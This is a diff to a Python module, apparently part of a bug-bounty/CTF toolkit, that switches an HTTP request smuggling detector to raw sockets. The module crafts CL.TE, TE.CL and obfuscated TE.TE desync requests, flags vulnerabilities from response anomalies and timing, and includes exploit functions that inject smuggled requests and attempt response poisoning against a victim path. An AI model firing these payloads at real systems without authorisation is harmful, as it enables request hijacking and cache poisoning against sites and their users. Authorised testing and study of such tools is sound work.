@@ -1,9 +1,16 @@
 """HTTP request smuggling detection and exploitation.
 
-Detects and exploits CL.TE and TE.CL request smuggling vulnerabilities:
-- CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding
-- TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length
-- TE.TE: Both use Transfer-Encoding but one can be obfuscated
+Detects and exploits CL.TE, TE.CL, and TE.TE parser desynchronization through
+raw HTTP bytes (raw sockets — `requests` normalizes/rejects the conflicting
+Content-Length/Transfer-Encoding headers a smuggling probe depends on):
+- CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
+- TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
+- TE.TE: both use Transfer-Encoding but one side can be obfuscated
+
+Detection combines two signals: a response anomaly (4xx/5xx or a smuggled
+marker on the attack or a follow-up probe) AND a timing tell (an unterminated
+smuggled chunk makes the desynced back-end wait, delaying the response toward
+the timeout) — the classic CL.TE differential.
 
 Usage:
     from bugbounty_ctf.smuggling import SmugglingDetector
@@ -11,7 +18,7 @@ Usage:
     detector = SmugglingDetector("http://target/")
     results = detector.detect()
     if results["vulnerable"]:
-        detector.exploit_clte("/api/endpoint", method="POST", smuggled_body="...")
+        detector.exploit_clte("/api/endpoint", smuggled_request="...")
 """
 
 from __future__ import annotations
@@ -20,12 +27,81 @@ import socket
 import ssl
 import time
 from dataclasses import dataclass, field
-from typing import Any
+from typing import Any, Final
 from urllib.parse import urlparse
 
-import requests
-
 from bugbounty_ctf.engine import SecurityScanner
+
+ANOMALOUS_STATUS_CODES: Final = {400, 408, 500, 502, 503, 504}
+
+
+def _decode_response(raw: bytes) -> str:
+    return raw.decode("utf-8", errors="replace")
+
+
+def _response_status(raw: bytes) -> int:
+    status_line = raw.split(b"\r\n", 1)[0]
+    parts = status_line.split(maxsplit=2)
+    if len(parts) < 2:
+        return 0
+    try:
+        return int(parts[1])
+    except ValueError:
+        return 0
+
+
+def _response_body(raw: bytes) -> str:
+    _headers, separator, body = raw.partition(b"\r\n\r\n")
+    if not separator:
+        return ""
+    return _decode_response(body)
+
+
+def _response_anomaly(raw: bytes) -> bool:
+    decoded = _decode_response(raw).lower()
+    return (
+        _response_status(raw) in ANOMALOUS_STATUS_CODES
+        or "smuggled" in decoded
+        or "timeout" in decoded
+    )
+
+
+def _raw_get(host: str, path: str = "/") -> bytes:
+    return (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()
+
+
+def _raw_chunked_post(
+    host: str,
+    body: str,
+    transfer_encoding: str = "Transfer-Encoding: chunked",
+) -> bytes:
+    return (
+        "POST / HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        f"Content-Length: {len(body)}\r\n"
+        f"{transfer_encoding}\r\n"
+        "Connection: close\r\n"
+        "\r\n"
+        f"{body}"
+    ).encode()
+
+
+def _mark_inconclusive(result: SmugglingResult, exc: OSError) -> SmugglingResult:
+    result.details["inconclusive"] = True
+    result.details["error"] = str(exc)
+    return result
+
+
+def _exploit_result(response: bytes, *, note: str | None = None) -> dict[str, Any]:
+    body_text = _response_body(response)[:500]
+    result: dict[str, Any] = {
+        "success": bool(body_text),
+        "status": _response_status(response),
+        "response": body_text,
+    }
+    if note is not None:
+        result["note"] = note
+    return result
 
 
 @dataclass
@@ -54,7 +130,6 @@ class SmugglingDetector:
     def __init__(self, target_url: str, *, scanner: SecurityScanner | None = None) -> None:
         self.target_url = target_url.rstrip("/")
         self.scanner = scanner
-        self.session = requests.Session()
         self.timeout = 10
 
     def _host_header(self) -> str:
@@ -104,6 +179,21 @@ class SmugglingDetector:
         finally:
             sock.close()
 
+    def _timed_send(self, raw: bytes) -> tuple[bytes, float]:
+        """Send raw bytes and return (response, elapsed_seconds).
+
+        The elapsed time is the timing tell for CL.TE/TE.CL: a desynced
+        back-end waits for a chunk terminator that never arrives, pushing the
+        response time toward ``self.timeout``.
+        """
+        start = time.monotonic()
+        response = self._send_raw(raw)
+        return response, time.monotonic() - start
+
+    def _timing_desync(self, elapsed: float) -> bool:
+        """True if a response was delayed enough to indicate a back-end wait."""
+        return elapsed >= self.timeout * 0.8
+
     def detect(self) -> dict[str, Any]:
         """Run all smuggling detection tests."""
         results: list[SmugglingResult] = []
@@ -111,14 +201,11 @@ class SmugglingDetector:
         print(f"[*] Testing HTTP request smuggling on {self.target_url}")
 
         for test_fn in [self.test_clte, self.test_tecl, self.test_tete]:
-            try:
-                result = test_fn()
-                results.append(result)
-                if result.vulnerable:
-                    print(f"  [!] VULNERABLE: {result.technique}")
-                    break
-            except Exception as e:
-                print(f"  [-] {test_fn.__name__} error: {e}")
+            result = test_fn()
+            results.append(result)
+            if result.vulnerable:
+                print(f"  [!] VULNERABLE: {result.technique}")
+                break
 
         vulnerable_any = any(r.vulnerable for r in results)
         return {
@@ -135,46 +222,27 @@ class SmugglingDetector:
         """
         result = SmugglingResult(technique="CL.TE")
 
-        # Time-based detection: if back-end uses TE, it waits for the chunk terminator
-        # The smuggled request never terminates, causing a timeout
         body = f"0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: {self._host_header()}\r\n\r\n"
-
-        headers = {
-            "Content-Length": str(len(body)),
-            "Transfer-Encoding": "chunked",
-        }
+        host = self._host_header()
 
         try:
-            start = time.time()
-            self.session.post(
-                self.target_url,
-                data=body,
-                headers=headers,
-                timeout=self.timeout,
-            )
-            elapsed_normal = time.time() - start
-        except requests.exceptions.Timeout:
+            attack_response, elapsed = self._timed_send(_raw_chunked_post(host, body))
+            probe_response = self._send_raw(_raw_get(host))
+        except OSError as exc:
+            return _mark_inconclusive(result, exc)
+
+        if _response_anomaly(attack_response) or _response_anomaly(probe_response):
             result.vulnerable = True
-            result.evidence = "Request timed out — back-end likely using Transfer-Encoding (CL.TE)"
-            result.timing_diff = self.timeout
-            return result
-        except Exception:
-            pass
-
-        # Second request should be affected if smuggling worked
-        try:
-            start = time.time()
-            self.session.get(self.target_url, timeout=self.timeout)
-            elapsed_second = time.time() - start
-
-            if elapsed_second > elapsed_normal * 2:
-                result.vulnerable = True
-                result.evidence = (
-                    f"Second request delayed ({elapsed_second:.2f}s vs {elapsed_normal:.2f}s)"
-                )
-                result.timing_diff = elapsed_second - elapsed_normal
-        except Exception:
-            pass
+            result.evidence = (
+                "CL.TE request caused response anomaly after smuggled prefix was sent"
+            )
+        elif self._timing_desync(elapsed):
+            result.vulnerable = True
+            result.timing_diff = elapsed
+            result.evidence = (
+                f"CL.TE request delayed {elapsed:.1f}s (~timeout) — back-end waited for "
+                "a chunk terminator the front-end did not forward"
+            )
 
         return result
 
@@ -184,31 +252,23 @@ class SmugglingDetector:
 
         body = f"8\r\nSMUGGLED\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: {self._host_header()}\r\n\r\n"
 
-        headers = {
-            "Content-Length": str(len(body)),
-            "Transfer-Encoding": "chunked",
-        }
+        host = self._host_header()
 
         try:
-            start = time.time()
-            self.session.post(
-                self.target_url,
-                data=body,
-                headers=headers,
-                timeout=self.timeout,
-            )
-            elapsed = time.time() - start
+            attack_response, elapsed = self._timed_send(_raw_chunked_post(host, body))
+            probe_response = self._send_raw(_raw_get(host))
+        except OSError as exc:
+            return _mark_inconclusive(result, exc)
 
-            if elapsed > self.timeout * 0.8:
-                result.vulnerable = True
-                result.evidence = "Request delayed — possible TE.CL smuggling"
-                result.timing_diff = elapsed
-        except requests.exceptions.Timeout:
+        if _response_anomaly(attack_response) or _response_anomaly(probe_response):
             result.vulnerable = True
-            result.evidence = "Timeout — possible TE.CL smuggling"
-            result.timing_diff = self.timeout
-        except Exception:
-            pass
+            result.evidence = (
+                "TE.CL request caused response anomaly after smuggled prefix was sent"
+            )
+        elif self._timing_desync(elapsed):
+            result.vulnerable = True
+            result.timing_diff = elapsed
+            result.evidence = f"TE.CL request delayed {elapsed:.1f}s (~timeout) — possible desync"
 
         return result
 
@@ -233,34 +293,18 @@ class SmugglingDetector:
             # Build the request bytes by hand so the obfuscated Transfer-Encoding
             # header is transmitted verbatim — http.client would normalise or
             # reject these, silently defeating the test.
-            raw = (
-                f"POST / HTTP/1.1\r\n"
-                f"Host: {host}\r\n"
-                f"Content-Length: {len(body)}\r\n"
-                f"{obf}\r\n"
-                f"Connection: close\r\n"
-                f"\r\n"
-                f"{body}"
-            ).encode()
-
             try:
-                self._send_raw(raw)
+                attack_response = self._send_raw(_raw_chunked_post(host, body, obf))
+                probe_response = self._send_raw(_raw_get(host))
 
-                # A fresh connection: if the smuggled prefix poisoned the
-                # back-end, the next request is malformed/anomalous.
-                probe = (f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()
-                resp = self._send_raw(probe).decode("utf-8", errors="replace")
-
-                status_line = resp.split("\r\n", 1)[0]
-                anomalous = " 400 " in status_line or " 500 " in status_line
-                if "smuggled" in resp.lower() or anomalous:
+                if _response_anomaly(attack_response) or _response_anomaly(probe_response):
                     result.vulnerable = True
                     result.evidence = f"Obfuscation '{obf[:50]}' caused response anomaly"
                     result.details["obfuscation"] = obf
                     return result
 
-            except OSError:
-                continue
+            except OSError as exc:
+                return _mark_inconclusive(result, exc)
 
         return result
 
@@ -289,20 +333,12 @@ class SmugglingDetector:
 
         body = f"0\r\n\r\n{smuggled_request}"
 
-        headers = {
-            "Content-Length": str(len(body)),
-            "Transfer-Encoding": "chunked",
-        }
-
         try:
-            r = self.session.post(self.target_url, data=body, headers=headers, timeout=self.timeout)
-            return {
-                "success": True,
-                "status": r.status_code,
-                "response": r.text[:500],
-            }
-        except Exception as e:
-            return {"success": False, "error": str(e)}
+            response = self._send_raw(_raw_chunked_post(host, body))
+        except OSError as exc:
+            return {"success": False, "error": str(exc)}
+
+        return _exploit_result(response)
 
     def exploit_store_response(
         self,
@@ -316,21 +352,13 @@ class SmugglingDetector:
 
         body = f"0\r\n\r\n{smuggled}"
 
-        headers = {
-            "Content-Length": str(len(body)),
-            "Transfer-Encoding": "chunked",
-        }
-
         try:
-            self.session.post(self.target_url, data=body, headers=headers, timeout=self.timeout)
-            time.sleep(1)
+            self._send_raw(_raw_chunked_post(host, body))
+            response = self._send_raw(_raw_get(host, victim_path))
+        except OSError as exc:
+            return {"success": False, "error": str(exc)}
 
-            r = self.session.get(f"{self.target_url}{victim_path}", timeout=self.timeout)
-            return {
-                "success": True,
-                "status": r.status_code,
-                "response": r.text[:500],
-                "note": "Response may have been poisoned — check if content differs from normal",
-            }
-        except Exception as e:
-            return {"success": False, "error": str(e)}
+        return _exploit_result(
+            response,
+            note="Response may have been poisoned — check if content differs from normal",
+        )
